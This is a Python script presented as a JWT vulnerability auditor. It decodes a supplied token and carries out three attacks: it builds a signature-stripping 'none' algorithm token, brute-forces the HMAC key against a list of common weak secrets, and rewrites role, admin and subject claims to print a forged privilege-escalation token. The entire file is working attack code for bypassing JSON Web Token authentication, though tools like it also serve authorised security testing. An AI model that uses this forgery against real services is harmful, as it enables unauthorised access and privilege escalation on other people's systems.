import sys
import json
import base64
import hmac
import hashlib

def banner():
    print("=============================================================")
    print(" [*] NATIVE JWT VULNERABILITY & CLAIM TAMPERING AUDITOR")
    print("=============================================================")

def base64url_decode(input_str):
    # Add missing padding for base64 decoding
    input_str += '=' * (-len(input_str) % 4)
    return base64.urlsafe_b64decode(input_str.encode('utf-8'))

def base64url_encode(input_bytes):
    return base64.urlsafe_b64encode(input_bytes).rstrip(b'=').decode('utf-8')

def parse_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) != 3:
            print("[-] Invalid JWT structure. Must have 3 parts separated by dots.")
            return None, None, None
        
        header = json.loads(base64url_decode(parts[0]).decode('utf-8'))
        payload = json.loads(base64url_decode(parts[1]).decode('utf-8'))
        signature = parts[2]
        return header, payload, parts
    except Exception as e:
        print(f"[-] Failed to parse JWT: {e}")
        return None, None, None

def audit_jwt(token):
    banner()
    print(f"[*] Target Token: {token}\n")
    
    header, payload, parts = parse_jwt(token)
    if not header:
        return
    
    print("[+] Decoded JWT Header:")
    print(json.dumps(header, indent=4))
    
    print("\n[+] Decoded JWT Payload (Claims):")
    print(json.dumps(payload, indent=4))
    print("-" * 65)
    
    # 1. Test 'none' Algorithm Bypass
    print("\n[*] Test 1: Checking 'none' Algorithm Vulnerability...")
    modified_header = header.copy()
    modified_header["alg"] = "none"
    
    new_header_b64 = base64url_encode(json.dumps(modified_header).encode('utf-8'))
    new_payload_b64 = parts[1] # Keep original payload
    
    none_alg_token = f"{new_header_b64}.{new_payload_b64}."
    print(f"    [!] Generated 'none' Alg Token (Signaturless Bypass):\n        {none_alg_token}")
    
    # 2. Weak Secret Brute-Forcing
    print("\n[*] Test 2: Brute-Forcing Common / Weak HMAC Secrets...")
    common_secrets = [
        "secret", "password", "123456", "admin", "key", "jwt_secret", 
        "changeme", "supersecret", "test", "apiKey", "auth123"
    ]
    
    found_secret = None
    signing_input = f"{parts[0]}.{parts[1]}".encode('utf-8')
    
    for secret in common_secrets:
        sig_computed = hmac.new(secret.encode('utf-8'), signing_input, hashlib.sha256).digest()
        sig_b64 = base64url_encode(sig_computed)
        if sig_b64 == parts[2]:
            found_secret = secret
            print(f"    [+] SUCCESS! Weak HMAC Secret Discovered: '{secret}'")
            break
            
    if not found_secret:
        print("    [-] No common weak secrets matched signature. Token likely uses a strong or asymmetric (RSA) key.")

    # 3. Claim Tampering Demonstration
    print("\n[*] Test 3: Simulating Claim Tampering (Privilege Escalation)...")
    tampered_payload = payload.copy()
    
    # Look for common role/admin/user ID fields to modify
    for key in list(tampered_payload.keys()):
        if any(k in key.lower() for k in ["role", "admin", "is_admin", "user", "sub"]):
            print(f"    [i] Found claim '{key}': {tampered_payload[key]}")
            if key.lower() == "role":
                tampered_payload[key] = "admin"
            elif "admin" in key.lower():
                tampered_payload[key] = True
            elif key.lower() in ["sub", "id", "user_id"]:
                tampered_payload[key] = 1 # Mutate to admin ID 1
                
    new_payload_b64_tampered = base64url_encode(json.dumps(tampered_payload).encode('utf-8'))
    
    if found_secret:
        # Re-sign with discovered secret
        tampered_signing_input = f"{parts[0]}.{new_payload_b64_tampered}".encode('utf-8')
        new_sig = base64url_encode(hmac.new(found_secret.encode('utf-8'), tampered_signing_input, hashlib.sha256).digest())
        forged_token = f"{parts[0]}.{new_payload_b64_tampered}.{new_sig}"
        print(f"    [!] Forged Priv-Esc Token (Re-signed with secret '{found_secret}'):\n        {forged_token}")
    else:
        # Output unsigned/none version
        forged_token = f"{new_header_b64}.{new_payload_b64_tampered}."
        print(f"    [!] Forged Priv-Esc Token (Using 'none' alg bypass):\n        {forged_token}")

    print("\n=============================================================")
    print("[*] JWT Audit Complete.")
    print("=============================================================")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python jwt_auditor.py <jwt_token_string>")
        print("Example: python jwt_auditor.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
        sys.exit(1)
        
    audit_jwt(sys.argv[1])
